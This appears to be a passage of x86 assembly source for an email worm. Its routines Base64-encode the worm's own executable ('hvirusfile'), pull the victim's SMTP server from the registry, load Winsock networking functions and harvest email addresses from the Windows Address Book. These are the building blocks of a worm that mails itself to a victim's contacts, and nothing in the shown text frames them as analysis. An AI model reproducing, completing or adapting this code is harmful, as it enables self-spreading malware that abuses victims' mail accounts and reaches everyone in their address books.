	push	FILE_MAP_READ
	push	dword ptr [ebp + hvirusmap]
	call	[ebp + MapViewOfFile]
	cmp	eax,0h
	je	B64CloseMapErr
	mov	[ebp + hvirusinmem],eax
	xchg	eax,esi
	mov	edi,[ebp + base64outputmem]
	mov	ecx,[ebp + virusfilesize]
	call	Base64
	mov	[ebp + sizeofbase64out],eax
	push	[ebp + hvirusinmem]
	call	[ebp + UnMapViewOfFile]
	push	[ebp + hvirusmap]
	call	[ebp + CloseHandle]
	push	[ebp + hvirusfile]
	call	[ebp + CloseHandle]
	stc
	ret
B64CloseMapErr:
	push	dword ptr [ebp + hvirusmap]
	call	[ebp + CloseHandle]
B64FreeMemErr:
	push	dword ptr [ebp + base64outputmem]
	call	[ebp + GlobalFree]
CloseFileErr:
	push	[ebp + hvirusfile]
	call	[ebp + CloseHandle]
Base64CreationErr:
	clc
	ret
	
	wvltg_exe_path	db	0ffh	dup(0)
	hvirusfile	dd	0
	virusfilesize	dd	0
	base64outputmem	dd	0
	sizeofbase64out	dd	0
	hvirusmap	dd	0
	hvirusinmem	dd	0

;input:
;esi - data source
;edi - where to write encoded data
;ecx - size of data to encode
;output:
;eax - size of encoded data
Base64:	xor	edx,edx
	push	edx
@3Bytes:push	edx
	xor	eax,eax
	xor	ebx,ebx
	or	al,byte ptr [esi]
	shl	eax,8h
	inc	esi
	or	al,byte ptr [esi]
	shl	eax,8h
	inc	esi
	or	al,byte ptr [esi]
	inc	esi
	push	ecx
	mov	ecx,4h
@outbit:mov	ebx,eax
	and	ebx,3fh				;leave only 6 bits
	lea	edx,[ebp + Base64Table]
	mov	bl,byte ptr [ebx + edx]
	mov	byte ptr [edi + ecx - 1h],bl
	shr	eax,6h
	loop	@outbit
	pop	ecx
	sub	ecx,2h
	add	edi,4h
	pop	edx
	add	edx,4h
	add	dword ptr [esp],4h
	cmp	ecx,3h
	jb	ExitB64
	cmp	edx,4ch				;did we need to add new line ?
	jne	DoLoop
	xor	edx,edx
	mov	word ptr [edi],0a0dh
	add	edi,2h
	add	dword ptr [esp],2h
DoLoop:	loop	@3Bytes
ExitB64:pop	eax
	ret
	
Base64Table	db	"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

;get the default smtp server from the registry
GetSMTPServer:
	mov	dword ptr [ebp + hkey],0h
	lea	eax,[ebp + hkey]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	lea	eax,[ebp +smtp_key]
	push	eax
	push	HKEY_CURRENT_USER
	call	[ebp + RegOpenKeyEx]
	cmp	eax,ERROR_SUCCESS
	jne	SmtpGetErr
	lea	eax,[ebp + SizeOfAccountNum]
	push	eax
	lea	eax,[ebp + accountnum]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	lea	eax,[ebp + default_mail]
	push	eax
	push	dword ptr [ebp + hkey]
	call	[ebp + RegQueryValueEx]
	cmp	eax,ERROR_SUCCESS
	jne	CloseKeyErr
	lea	eax,[ebp + accountnum]
	push	eax
	lea	eax,[ebp + accountkey]
	push	eax
	call	[ebp + lstrcat]
	cmp	eax,0h
	je	CloseKeyErr
	lea	eax,[ebp + hkey]
	push	eax
	push	KEY_READ
	push	0h
	lea	eax,[ebp + accountkey]
	push	eax
	push	dword ptr [ebp + hkey]
	call	[ebp + RegOpenKeyEx]
	cmp	eax,ERROR_SUCCESS
	jne	CloseKeyErr
	lea	eax,[ebp + SizeOfSMTPServerAdd]
	push	eax
	lea	eax,[ebp + SmtpServerAdd]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	lea	eax,[ebp + smtp_server]
	push	eax
	push	dword ptr [ebp + hkey]
	call	[ebp + RegQueryValueEx]
	cmp	eax,ERROR_SUCCESS
	jne	CloseKeyErr
	push	dword ptr [ebp + hkey]
	call	[ebp + RegCloseKey]
	stc
	ret
CloseKeyErr:
	push	dword ptr [ebp + hkey]
	call	[ebp + RegCloseKey]
SmtpGetErr:
	clc
	ret
	
	smtp_key	db	"Software\Microsoft\Internet Account Manager",0
	default_mail	db	"Default Mail Account",0
	smtp_server	db	"SMTP Server",0
	SmtpServerAdd	db	75	dup(0)
	SizeOfSMTPServerAdd	dd	75
	accountnum	db	75	dup(0)
	SizeOfAccountNum	dd	75
	accountkey	db	"Accounts\",75	dup(0)
	
	
	
GetWinsockApis:
	lea	eax,[ebp + WinsockDll]
	push	eax
	call	[ebp + LoadLibrary]
	cmp	eax,0h
	je	GetWinsockApisErr
	mov	dword ptr [ebp + hWinsock],eax
	xchg	eax,edx
	mov	ecx,NumberOfWinsockFunctions
	lea	eax,[ebp + winsock_functions_sz]
	lea	ebx,[ebp + winsock_functions_addresses]
	call	get_apis
	ret
GetWinsockApisErr:
	clc
	ret
	
	WinsockDll	db	"ws2_32.dll",0
	hWinsock	dd	0
	
	
	winsock_functions_sz:
	
	_WSAStartup	db	"WSAStartup",0
	_WSACleanup	db	"WSACleanup",0
	_socket		db	"socket",0
	_gethostbyname	db	"gethostbyname",0
	_connect	db	"connect",0
	_recv		db	"recv",0
	_send		db	"send",0
	_htons		db	"htons",0
	_closesocket	db	"closesocket",0
	
	winsock_functions_addresses:
	
	WSAStartup	dd	0
	WSACleanup	dd	0
	socket		dd	0
	gethostbyname	dd	0
	connect		dd	0
	recv		dd	0
	send		dd	0
	htons		dd	0
	closesocket	dd	0
	
	NumberOfWinsockFunctions	equ	9
	
	
	
;scan the windows address book for email addresses
ScanWAB:				
	mov	dword ptr [ebp + hkey],0h
	lea	eax,[ebp + hkey]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	lea	eax,[ebp + WAB_Location]
	push	eax
	push	HKEY_CURRENT_USER
	call	[ebp + RegOpenKeyEx]
	cmp	eax,ERROR_SUCCESS
	jne	WabScanErr
	lea	eax,[ebp + SizeOfWAB_PATH]
	push	eax
	lea	eax,[ebp + WAB_Path]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	[ebp + hkey]
	call	[ebp + RegQueryValueEx]	;get the wab file location
	cmp	eax,ERROR_SUCCESS
	jne	CloseWABkeyAndExit
	push	dword ptr [ebp + hkey]
	call	[ebp + RegCloseKey]
	;open the wab file:
	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	eax
	push	FILE_SHARE_READ
	push	GENERIC_READ
	lea	eax,[ebp + WAB_Path]
	push	eax
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	WabScanErr
	mov	dword ptr [ebp + hWabFile],eax
	;map the wab file:
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	PAGE_READONLY
	push	eax
	push	dword ptr [ebp + hWabFile]
	call	[ebp + CreateFileMapping]
	cmp	eax,0h
	jne	MapWab
ErrCMF:	push	dword ptr [ebp + hWabFile]	;error close wab file
	call	[ebp + CloseHandle]
	jmp	WabScanErr
MapWab:	mov	[ebp + hWabMap],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	FILE_MAP_READ
	push	dword ptr [ebp + hWabMap]
	call	[ebp + MapViewOfFile]
	cmp	eax,0h
	jne	ReadAddresses
ErrCWM:	push	dword ptr [ebp + hWabMap]	;error close wab map
	call	[ebp + CloseHandle]
	jmp	ErrCMF
ReadAddresses:	
	mov	[ebp +	hWabMapBase],eax
	mov	ax,word ptr [eax + 64h]		;get number of email addresses
	cmp	ax,1h
	jnbe	AllocAddMem
ErrUWF:	push	dword ptr [ebp + hWabMapBase]	;error unmap wab file
	call	[ebp + UnMapViewOfFile]
	jmp	ErrCWM	
AllocAddMem:
	mov	word ptr [ebp + NumberOfMailAddresses],ax
	mov	cx,44h				;every mail address allocated 68 bytes
	mul	cx				;ax = size of allocated memory
	xor	ebx,ebx
	xchg	ax,bx
	push	ebx
	push	GPTR
	call	[ebp + GlobalAlloc]
	cmp	eax,0h
	je	ErrUWF
	mov	[ebp + hMailAddresses],eax
	xchg	eax,ebx
	xor	ecx,ecx
	mov	eax,[ebp + hWabMapBase]
	mov	cx,word ptr [ebp + NumberOfMailAddresses]
	add	eax,[eax + 60h]			;goto start of emails
NxtMail:push	ecx
	mov	ecx,44h
CpyMail:cmp	byte ptr [eax],0h
	je	MovNext
	mov	dl,byte ptr [eax]
	mov	byte ptr [ebx],dl
	inc	ebx
	add	eax,2h
	dec	ecx
	loop	CpyMail
MovNext:add	eax,ecx
	inc	ebx
	mov	byte ptr [ebx],0h
	pop	ecx
	loop	NxtMail
	push	dword ptr [ebp + hWabMapBase]
	call	[ebp + UnMapViewOfFile]
	push	dword ptr [ebp + hWabMap]
	call	[ebp + CloseHandle]
	push	dword ptr [ebp + hWabFile]
	call	[ebp + CloseHandle]
	ret
CloseWABkeyAndExit:
	push	dword ptr [ebp + hkey]
	call	[ebp + RegCloseKey]
WabScanErr:
	ret
	
	
	WAB_Location		db	"Software\Microsoft\WAB\WAB4\Wab File Name",0
	WAB_Path		db	0ffh	dup(0)
	SizeOfWAB_PATH		dd	0ffh
	hWabFile		dd	0
	hWabMap			dd	0
	hWabMapBase		dd	0
	hMailAddresses		dd	0
	NumberOfMailAddresses	dw	0
	